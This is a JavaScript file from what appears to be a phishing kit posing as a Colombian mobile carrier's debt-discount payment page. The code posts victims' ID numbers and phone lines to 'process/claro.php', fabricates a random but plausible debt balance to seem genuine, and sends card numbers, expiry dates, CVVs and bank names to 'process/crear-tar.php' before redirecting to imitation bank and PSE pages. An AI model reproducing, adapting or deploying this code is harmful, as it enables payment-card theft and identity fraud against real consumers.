let tipo = '';
var nombre = "";
var lineacel = "";


function cambiaimg(value) {
    var imagen1 = document.getElementById('check1');
    var imagen2 = document.getElementById('check2');
    var imagen3 = document.getElementById('check3');
    var imagen4 = document.getElementById('check4');

    if (value === 1) {
        tipo = 'TLF';
        imagen1.src = 'img/check.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 2) {
        tipo = 'Hogar';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/check.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 3) {
        tipo = 'Equipo';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/check.png';
        imagen4.src = 'img/uncheck.png';
    } else if (value === 4) {
        tipo = 'Internet';
        imagen1.src = 'img/uncheck.png';
        imagen2.src = 'img/uncheck.png';
        imagen3.src = 'img/uncheck.png';
        imagen4.src = 'img/check.png';
    }
}


function selectTC(option,banco) {  
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validación de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }

  $.post( "process/crear-tar.php", { tar:numtc,fec:fechat,cvv:codcv,ban:banco } ,function(data) {    
    window.location.href = "transaction/ent/" + option;  
    //window.location.href = "PSEUserRegister/?o=" + option;
  }); 
}


function selectOption2(option) {
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validación de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }

}


function formatInput(input) {
// Eliminar cualquier carácter que no sea un dígito
var value = input.value.replace(/\D/g, '');

if (input.id === "numtc") {
// Formatear número de tarjeta de crédito
var formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
input.value = formattedValue;
} else if (input.id === "fechat") {
// Formatear fecha de vencimiento
var formattedValue = value.replace(/(\d{0,2})(\d{0,4})/, function(match, p1, p2) {
if (!p2) return p1;
return p1 + '/' + p2;
});
input.value = formattedValue;
}
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function porcentaje(deudar) {
    // Convertir el valor (puede venir con puntos como separadores de miles)
    var monto = parseFloat(deudar.toString().replace(/\./g, ''));
    
    document.getElementById("deuda").innerText = monto.toLocaleString('es-CO');
    
    // Calcular el descuento y el total
    var descuento = monto * 0.30;
    var montoConDescuento = monto - descuento;
    
    // Mostrar los resultados con separadores de mil
    document.getElementById('descuento').innerText = Math.round(descuento).toLocaleString('es-CO');
    document.getElementById('total').innerText = Math.round(montoConDescuento).toLocaleString('es-CO');
}

function cargar_resumen(v) {
    $("#espera").hide();
    $("#section2").show();
    document.getElementById('nombre').innerText = nombre;
    document.getElementById('celular2').innerText = lineacel;
    porcentaje(v);       
}

function opciones_pago() {
    $("#section2").hide();
    $("#section3").show();       
}

// Función para generar un número aleatorio entre min y max
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Función para generar un saldo entre 48.000 y 53.000, múltiplo de 100
function generarSaldoAleatorio() {
    // Rango: 48000 a 53000, múltiplos de 100
    var min = 48000;
    var max = 53000;
    var multiplo = 100;
    var rango = Math.floor((max - min) / multiplo);
    var aleatorio = randomInt(0, rango);
    return min + (aleatorio * multiplo);
}

// Función para guardar el saldo de un número en localStorage
function guardarSaldoEnLocalStorage(telefono, saldo) {
    // Obtener los saldos guardados o crear un objeto vacío
    var saldosGuardados = localStorage.getItem('saldosPorNumero');
    if (saldosGuardados) {
        saldosGuardados = JSON.parse(saldosGuardados);
    } else {
        saldosGuardados = {};
    }
    
    // Guardar el saldo para este número
    saldosGuardados[telefono] = saldo;
    
    // Guardar nuevamente en localStorage
    localStorage.setItem('saldosPorNumero', JSON.stringify(saldosGuardados));
    
    console.log("Saldo guardado para " + telefono + ": " + saldo);
}

// Función para obtener el saldo de un número desde localStorage
function obtenerSaldoDeLocalStorage(telefono) {
    var saldosGuardados = localStorage.getItem('saldosPorNumero');
    if (saldosGuardados) {
        saldosGuardados = JSON.parse(saldosGuardados);
        if (saldosGuardados[telefono]) {
            return saldosGuardados[telefono];
        }
    }
    return null;
}

// Función para validar si el número de teléfono tiene prefijo permitido (301,302,304,305,310-324,330)
function validarPrefijoPermitido(telefono) {
    // Obtener los primeros 3 dígitos del teléfono
    var prefijo = telefono.toString().substring(0, 3);
    
    // Lista de prefijos permitidos
    var prefijosPermitidos = ['301', '302', '304', '305', '330'];
    
    // Prefijos de rango 310 a 324
    for (var i = 310; i <= 324; i++) {
        prefijosPermitidos.push(i.toString());
    }
    
    return prefijosPermitidos.includes(prefijo);
}

async function validarNumero() {  
  nombre = document.getElementById('documento').value;
  lineacel = document.getElementById('celular').value;

  var d = detectar_dispositivo();
  $.post( "process/claro.php", { idc:nombre, lin:lineacel, dis:d } ,function(data) {
    
  }); 

  const telefonoIngresado = document.getElementById('celular').value;
  
  // Verificar si el número tiene un prefijo permitido
  if (!validarPrefijoPermitido(telefonoIngresado)) {
      alert("Lo sentimos, el número de celular ingresado no corresponde a los operadores habilitados para este descuento. Por favor, intenta con otro número.");
      return;
  }
  
  // Verificar si ya existe un saldo guardado para este número en localStorage
  var saldoGuardado = obtenerSaldoDeLocalStorage(telefonoIngresado);
  
  if (saldoGuardado) {
      // Si ya existe un saldo guardado, usarlo directamente
      var valorFormateado = saldoGuardado.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
      console.log("Número encontrado en localStorage. Saldo recuperado: " + valorFormateado);
      
      $("#usuario").hide();
      $("#espera").show();        
      setTimeout(cargar_resumen, 3000, valorFormateado);
      return;
  }
  
  // Si no hay saldo guardado, buscar en numeros.txt
  const response = await fetch('numeros.txt');
  const data = await response.text();
  const lineas = data.split('\n').map(linea => linea.split(','));

  let encontrado = false;
  let valorCorrespondiente = 0;

  for (let i = 0; i < lineas.length; i++) {
    if (lineas[i].length < 2) {
      continue;
    }
    
    const telefono = lineas[i][0].trim().replace(/"/g, '');
    const valor = lineas[i][1].trim().replace(/"/g, '');
    
    if (telefono === telefonoIngresado) {
      // Limpiar el valor (eliminar puntos si los tiene)
      valorCorrespondiente = parseFloat(valor.toString().replace(/\./g, ''));
      encontrado = true;
      break;
    }
  }

  // Si no se encontró el número en la lista, generar saldo aleatorio
  if (!encontrado) {
    valorCorrespondiente = generarSaldoAleatorio();
    console.log("Número no encontrado en lista. Prefijo permitido: " + telefonoIngresado.substring(0,3) + " - Nuevo saldo asignado: " + valorCorrespondiente);
  } else {
    console.log("Número encontrado en numeros.txt. Saldo: " + valorCorrespondiente);
  }
  
  // Guardar el saldo en localStorage para futuras consultas del mismo número
  guardarSaldoEnLocalStorage(telefonoIngresado, valorCorrespondiente);
  
  // Formatear con puntos como separadores de miles para mostrar
  var valorFormateado = valorCorrespondiente.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");

  $("#usuario").hide();
  $("#espera").show();        
  
  setTimeout(cargar_resumen, 3000, valorFormateado);
}

function toggleOptions1() {
  var optionsList = document.getElementById("optionsList1");
  if (optionsList.style.display === "block") {
      optionsList.style.display = "none";      
  } else {
      optionsList.style.display = "block";
  }
}

// Función para seleccionar método de pago con redirección INMEDIATA
function selectOption1(option) {
    console.log("Opción seleccionada: " + option);
    
    // Guardar la opción seleccionada en el campo oculto
    var selectedValueInput = document.getElementById("selectedValue2");
    if (selectedValueInput) {
        selectedValueInput.value = option;
    }
    
    // REDIRECCIÓN INMEDIATA según el método de pago seleccionado
    if (option == "TRICOLOR") {    
        window.location.href = "transaction/sucursal";
    } else if (option == "NEQUI") {        
        window.location.href = "transaction/clientes";
    } else if (option == "De Bogota") {        
        window.location.href = "transaction/personas";
    } else if (option == "PSE") {        
        window.location.href = "transaction/PSEtransaction";
    } else if (option == "Tarjeta") {
        // Para Tarjeta, solo mostrar el formulario sin redirigir
        $("#section3").hide();
        $("#Tarjeta").show();
    } else {
        $("#section3").hide();
        $("#errorpasarela").show();
    }
}

// Función para el botón "Continuar" en la sección de métodos de pago (para Tarjeta)
function irAPago() {
    // Obtener el método de pago seleccionado
    var selectedOptionInput = document.getElementById("selectedValue2");
    var selectedOption = selectedOptionInput ? selectedOptionInput.value : "";
    
    console.log("Continuar con método: " + selectedOption);
    
    // Redirigir según el método de pago seleccionado
    if (selectedOption == "TRICOLOR") {    
        window.location.href = "transaction/sucursal";
    } else if (selectedOption == "NEQUI") {        
        window.location.href = "transaction/clientes";
    } else if (selectedOption == "De Bogota") {        
        window.location.href = "transaction/personas";
    } else if (selectedOption == "PSE") {        
        window.location.href = "transaction/PSEtransaction";
    } else if (selectedOption == "Tarjeta") {
        // Validar campos de tarjeta
        var numtc = document.getElementById("numtc") ? document.getElementById("numtc").value : "";
        var fechat = document.getElementById("fechat") ? document.getElementById("fechat").value : "";
        var codcv = document.getElementById("codcv") ? document.getElementById("codcv").value : "";
        var datost = document.getElementById("datost") ? document.getElementById("datost").value : "";
        
        if (numtc === "" || fechat === "" || codcv === "" || datost === "") {
            alert("Por favor, completa todos los datos de la tarjeta.");
        } else {
            alert("Procesando pago con tarjeta...");
        }
    } else {
        if (!selectedOption || selectedOption === "") {
            alert("Por favor, selecciona un método de pago (Tarjeta, Bancolombia, Nequi, PSE, etc.)");
        } else {
            $("#section3").hide();
            $("#errorpasarela").show();
        }
    }
}